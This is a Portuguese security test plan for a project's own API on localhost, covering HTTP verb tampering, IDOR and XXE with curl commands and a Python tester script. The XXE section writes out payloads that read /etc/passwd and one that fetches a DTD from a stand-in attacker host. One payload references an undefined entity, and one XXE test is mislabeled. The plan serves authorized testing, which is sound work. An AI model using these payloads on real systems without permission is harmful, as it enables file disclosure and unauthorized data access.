# Relatório 2 – Roteiro de Testes de Segurança em APIs

## Introdução
Este relatório apresenta um roteiro detalhado para a realização de testes de segurança nas principais rotas de API do projeto, com foco em três tipos de vulnerabilidades: HTTP Verb Tampering, IDOR (Insecure Direct Object Reference) e XXE (XML External Entity). As recomendações e observações de segurança também estão incluídas para garantir a condução responsável dos testes.

## Principais Rotas de API
O projeto possui as seguintes rotas de API principais:
- `/api/v1/rasa-conversations/`
- `/api/v1/opinion-component/`
- `/api/v1/conversations/`
- `/api/v1/comments/`
- `/api/v1/votes/`
- `/api/v1/clusterizations/`
- `/api/v1/profiles/`
- `/api/v1/boards/`
- `/api/v1/users/`
- `/api/v1/` (autenticação)

## 1. HTTP Verb Tampering
Teste o comportamento dos endpoints utilizando diferentes métodos HTTP:

```bash
# Teste de Autenticação
curl -X OPTIONS http://localhost:8000/api/v1/token/
curl -X PUT http://localhost:8000/api/v1/token/
curl -X DELETE http://localhost:8000/api/v1/token/
curl -X PATCH http://localhost:8000/api/v1/token/
curl -X HEAD http://localhost:8000/api/v1/token/

# Teste de Usuários
curl -X OPTIONS http://localhost:8000/api/v1/users/
curl -X PUT http://localhost:8000/api/v1/users/1/
curl -X DELETE http://localhost:8000/api/v1/users/1/
curl -X PATCH http://localhost:8000/api/v1/users/1/
curl -X HEAD http://localhost:8000/api/v1/users/1/

# Teste de Perfis
curl -X OPTIONS http://localhost:8000/api/v1/profiles/
curl -X PUT http://localhost:8000/api/v1/profiles/1/
curl -X DELETE http://localhost:8000/api/v1/profiles/1/
curl -X PATCH http://localhost:8000/api/v1/profiles/1/
curl -X HEAD http://localhost:8000/api/v1/profiles/1/

# Teste de Conversas
curl -X OPTIONS http://localhost:8000/api/v1/conversations/
curl -X PUT http://localhost:8000/api/v1/conversations/1/
curl -X DELETE http://localhost:8000/api/v1/conversations/1/
curl -X PATCH http://localhost:8000/api/v1/conversations/1/
curl -X HEAD http://localhost:8000/api/v1/conversations/1/
```

## 2. IDOR (Insecure Direct Object Reference)
Teste o acesso e modificação de recursos de outros usuários:

```bash
# Teste de Usuários
curl -X GET http://localhost:8000/api/v1/users/2/ -H "Authorization: Bearer seu_token"

# Teste de Perfis
curl -X PUT http://localhost:8000/api/v1/profiles/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"phone_number": "123456789"}'

# Teste de Conversas
curl -X GET http://localhost:8000/api/v1/conversations/2/ -H "Authorization: Bearer seu_token"

# Teste de Comentários
curl -X PUT http://localhost:8000/api/v1/comments/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"content": "comentário modificado"}'

# Teste de Votos
curl -X PUT http://localhost:8000/api/v1/votes/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"choice": "agree"}'

# Teste de Clusterizações
curl -X GET http://localhost:8000/api/v1/clusterizations/2/ -H "Authorization: Bearer seu_token"

# Teste de Quadros
curl -X PUT http://localhost:8000/api/v1/boards/2/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/json" \
  -d '{"title": "quadro modificado"}'
```

## 3. XXE (XML External Entity)
Teste endpoints que aceitam XML para identificar possíveis vulnerabilidades XXE:

```bash
# Criar arquivo XML malicioso
cat > payload.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOF

# Teste de Conversas
curl -X POST http://localhost:8000/api/v1/conversations/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/xml" \
  -d @payload.xml

# Teste de Comentários
curl -X POST http://localhost:8000/api/v1/comments/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/xml" \
  -d @payload.xml

# Criar arquivo XML com referência a entidade externa
cat > external.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://atacante.com/evil.dtd" >
%xxe;]>
<foo>&evil;</foo>
EOF

# Teste de Parameter Pollution
curl -X POST http://localhost:8000/api/v1/conversations/ \
  -H "Authorization: Bearer seu_token" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

## Script Python para Testes Automatizados

```python
import requests
import json
import xml.etree.ElementTree as ET

class SecurityTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
    
    def test_http_verb_tampering(self, endpoint):
        verbs = ["OPTIONS", "PUT", "DELETE", "PATCH", "HEAD"]
        for verb in verbs:
            response = requests.request(verb, f"{self.base_url}{endpoint}", headers=self.headers)
            print(f"Testing {verb} on {endpoint}: {response.status_code}")
    
    def test_idor(self, endpoint, resource_id):
        response = requests.get(f"{self.base_url}{endpoint}/{resource_id}", headers=self.headers)
        print(f"Testing IDOR on {endpoint}/{resource_id}: {response.status_code}")
    
    def test_xxe(self, endpoint):
        xxe_payload = """<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"""
        headers = self.headers.copy()
        headers["Content-Type"] = "application/xml"
        response = requests.post(f"{self.base_url}{endpoint}", data=xxe_payload, headers=headers)
        print(f"Testing XXE on {endpoint}: {response.status_code}")

# Uso do script
tester = SecurityTester("http://localhost:8000/api/v1", "seu_token")

# Testar HTTP Verb Tampering
endpoints = ["/users", "/profiles", "/conversations", "/comments"]
for endpoint in endpoints:
    tester.test_http_verb_tampering(endpoint)

# Testar IDOR
tester.test_idor("/users", "2")
tester.test_idor("/profiles", "2")
tester.test_idor("/conversations", "2")

# Testar XXE
tester.test_xxe("/conversations")
tester.test_xxe("/comments")
```

## Recomendações para os Testes

1. **HTTP Verb Tampering**:
   - Teste todos os verbos HTTP possíveis
   - Verifique se há métodos não documentados
   - Observe as respostas para identificar comportamentos inesperados

2. **IDOR**:
   - Teste com diferentes IDs de recursos
   - Verifique se há validação de propriedade
   - Teste diferentes níveis de acesso
   - Verifique se há vazamento de informações

3. **XXE**:
   - Teste diferentes payloads XML
   - Verifique se há processamento de XML
   - Teste diferentes tipos de entidades
   - Verifique se há vazamento de informações do sistema

## Observações de Segurança

1. Sempre teste em ambiente controlado
2. Documente todas as vulnerabilidades encontradas
3. Não execute testes em produção sem autorização
4. Mantenha um registro de todos os testes realizados
5. Reporte as vulnerabilidades de forma responsável

> **Atenção:** Estes testes devem ser realizados apenas em ambientes de desenvolvimento ou com autorização explícita. 